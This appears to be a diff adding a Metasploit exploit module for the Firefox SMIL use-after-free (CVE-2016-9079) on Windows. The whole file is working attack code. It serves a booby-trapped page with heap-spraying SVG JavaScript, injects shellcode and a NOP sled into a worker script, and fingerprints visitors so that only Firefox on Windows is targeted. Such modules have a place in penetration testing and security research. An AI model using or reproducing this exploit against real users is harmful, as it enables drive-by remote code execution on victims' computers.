@@ -1,0 +1,281 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+  class MetasploitModule < Msf::Exploit::Remote
+    Rank = NormalRanking
+
+    include Msf::Exploit::Remote::HttpServer
+
+    def initialize(info={})
+      super(update_info(info,
+        'Name'           => "Firefox nsSMILTimeContainer::NotifyTimeChange() RCE",
+        'Description'    => %q{
+          This module exploits an out-of-bounds indexing/use-after-free condition present in
+          nsSMILTimeContainer::NotifyTimeChange() across numerous versions of Mozilla Firefox
+          on Microsoft Windows.
+          },
+          'License'        => MSF_LICENSE,
+          'Author'         =>
+          [
+            'Anonymous Gaijin',                                 # Original research/exploit
+            'William Webb <william_webb[at]rapid7.com>'         # Metasploit module
+          ],
+          'Platform'       => 'win',
+          'Targets'        =>
+          [
+            [ 'Mozilla Firefox',
+              {
+                'Platform' => 'win',
+                'Arch'     => ARCH_X86,
+              }
+            ],
+          ],
+          'DefaultOptions'  =>
+          {
+            'EXITFUNC' => "thread",
+            'InitialAutoRunScript' => 'migrate -f'
+          },
+          'References'     =>
+          [
+            [ 'CVE', '2016-9079' ],
+            [ 'Bugzilla', '1321066' ]
+          ],
+          'Arch'           => ARCH_X86,
+          'DisclosureDate' => "Nov 30 2016",
+          'DefaultTarget'  => 0
+        )
+      )
+    register_options(
+      [
+        OptBool.new('UsePostHTML', [ true, 'Rewrite page with arbitrary HTML after successful exploitation.  NOTE: if set to true, you should probably rewrite data/exploits/ff_smil_uaf/post.html to something useful!', false ]),
+      ], self.class
+    )
+  end
+
+  def exploit_html(cli)
+    p = payload.encoded
+    arch = Rex::Arch.endian(target.arch)
+    payload_final = Rex::Text.to_unescape(p, arch, prefix='\\u')
+    base_uri = "#{get_resource.chomp('/')}"
+
+    # stuff that gets adjusted alot during testing
+
+    defrag_x = %Q~
+       for (var i = 0; i < 0x4000; i++)
+         heap80[i] = block80.slice(0)
+     ~
+     defrag_y = %Q~
+       for (var i = 0x4401; i < heap80.length; i++)
+         heap80[i] = block80.slice(0)
+     ~
+
+    js = %Q~
+    var worker = new Worker('#{base_uri}/worker.js');
+    var svgns = 'http://www.w3.org/2000/svg';
+    var heap80 = new Array(0x5000);
+    var heap100 = new Array(0x5000);
+    var block80 = new ArrayBuffer(0x80);
+    var block100 = new ArrayBuffer(0x100);
+    var sprayBase = undefined;
+    var arrBase = undefined;
+
+    var animateX = undefined;
+    var containerA = undefined;
+
+    var milestone_offset = 0x90;
+
+    var $ = function(id) { return document.getElementById(id); }
+
+    var heap = function()
+    {
+     var u32 = new Uint32Array(block80)
+
+     u32[4] = arrBase - milestone_offset;
+
+     u32[0xa] = arrBase + 0x1000 - milestone_offset;
+
+     u32[0x10] = arrBase + 0x2000 - milestone_offset;
+
+     var x = document.createElementNS(svgns, 'animate')
+     var svg = document.createElementNS(svgns, 'svg')
+
+     svg.appendChild(x)
+     svg.appendChild(x.cloneNode(true))
+
+     for (var i = 0; i < 0x400; i++)
+       {
+         var node = svg.cloneNode(true);
+         node.setAttribute('id', 'svg' + i)
+         document.body.appendChild(node);
+       }
+       #{defrag_x}
+
+       for (var i = 0; i < 0x400; i++)
+         {
+           heap80[i + 0x3000] = block80.slice(0)
+           $('svg' + i).appendChild(x.cloneNode(true))
+         }
+
+         for (var i = 0; i < 0x400; i++)
+           {
+             $('svg' + i).appendChild(x.cloneNode(true))
+             $('svg' + i).appendChild(x.cloneNode(true))
+           }
+
+           for (var i = 0; i < heap100.length; i++)
+             heap100[i] = block100.slice(0)
+
+             #{defrag_y}
+
+             for (var i = 0x100; i < 0x400; i++)
+               $('svg' + i).appendChild(x.cloneNode(true))
+             }
+
+             var exploit = function()
+             {
+               heap();
+
+               animateX.setAttribute('begin', '59s')
+               animateX.setAttribute('begin', '58s')
+               animateX.setAttribute('begin', '10s')
+               animateX.setAttribute('begin', '9s')
+
+               // money shot
+
+               containerA.pauseAnimations();
+             }
+
+             worker.onmessage = function(e)
+             {
+              worker.onmessage = function(e)
+              {
+               window.setTimeout(function()
+               {
+                 worker.terminate();
+                 document.body.innerHTML = '';
+                 document.getElementsByTagName('head')[0].innerHTML = '';
+                 document.body.setAttribute('onload', '')
+                 document.write('<blink>')
+                 }, 1000);
+  }
+
+  arrBase = e.data;
+  exploit();
+  }
+
+
+  var idGenerator = function()
+  {
+   return 'id' + (((1+Math.random())*0x10000)|0).toString(16).substring(1);
+  }
+
+
+  var craftDOM = function()
+  {
+   containerA = document.createElementNS(svgns, 'svg')
+   var containerB = document.createElementNS(svgns, 'svg');
+
+   animateX = document.createElementNS(svgns, 'animate')
+   var animateA = document.createElementNS(svgns, 'animate')
+   var animateB = document.createElementNS(svgns, 'animate')
+
+   var animateC = document.createElementNS(svgns, 'animate')
+
+   var idX = idGenerator();
+   var idA = idGenerator();
+   var idB = idGenerator();
+   var idC = idGenerator();
+
+   animateX.setAttribute('id', idX);
+   animateA.setAttribute('id', idA);
+   animateA.setAttribute('end', '50s');
+   animateB.setAttribute('id', idB);
+   animateB.setAttribute('begin', '60s');
+   animateB.setAttribute('end', idC + '.end');
+   animateC.setAttribute('id', idC);
+   animateC.setAttribute('begin', '10s');
+   animateC.setAttribute('end', idA + '.end');
+
+   containerA.appendChild(animateX)
+   containerA.appendChild(animateA)
+   containerA.appendChild(animateB)
+
+   containerB.appendChild(animateC)
+
+   document.body.appendChild(containerA);
+   document.body.appendChild(containerB);
+  }
+  window.onload = craftDOM;
+    ~
+
+    # If you want to change the appearance of the landing page, do it here
+
+    html = %Q~
+    <html>
+    <head>
+    <meta charset="utf-8"/>
+    <script>
+    #{js}
+    </script>
+    </head>
+    <body>
+    </body>
+    </html>
+    ~
+
+    if datastore['UsePostHTML']
+      f = File.open(File.join(Msf::Config.data_directory, "exploits", "firefox_smil_uaf", "post.html"), "rb")
+      c = f.read
+      html = html.gsub("<blink>", c)
+    else
+      html = html.gsub("<blink>", "")
+    end
+    send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache', 'Connection' => 'close' })
+  end
+
+  def worker_js(cli)
+    p = payload.encoded
+    arch = Rex::Arch.endian(target.arch)
+    payload = Rex::Text.to_unescape(p, arch)
+    wt = File.open(File.join(Msf::Config.data_directory, "exploits", "firefox_smil_uaf", "worker.js"), "rb")
+    c = wt.read
+    c = c.gsub("INSERTSHELLCODEHEREPLZ", payload)
+    c = c.gsub("NOPSGOHERE", "\u9090")
+    send_response(cli, c, { 'Content-Type' => 'application/javascript', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache', 'Connection' => 'close' })
+  end
+
+  def is_ff_on_windows(user_agent)
+    target_hash = fingerprint_user_agent(user_agent)
+    if target_hash[:ua_name] !~ /Firefox/ or target_hash[:os_name] !~ /Windows/
+      return false
+    end
+      return true
+  end
+
+  def on_request_uri(cli, request)
+    print_status("Got request: #{request.uri}")
+    print_status("From: #{request.headers['User-Agent']}")
+    if (!is_ff_on_windows(request.headers['User-Agent']))
+      print_error("Unsupported user agent: #{request.headers['User-Agent']}")
+      send_not_found(cli)
+      close_client(cli)
+      return
+    end
+    if request.uri =~ /worker\.js/
+      print_status("Sending worker thread Javascript ...")
+      worker_js(cli)
+      return
+    end
+    if request.uri =~ /index\.html/ or request.uri =~ /\//
+
+      print_status("Sending exploit HTML ...")
+      exploit_html(cli)
+      close_client(cli)
+      return
+    end
+  end
+end
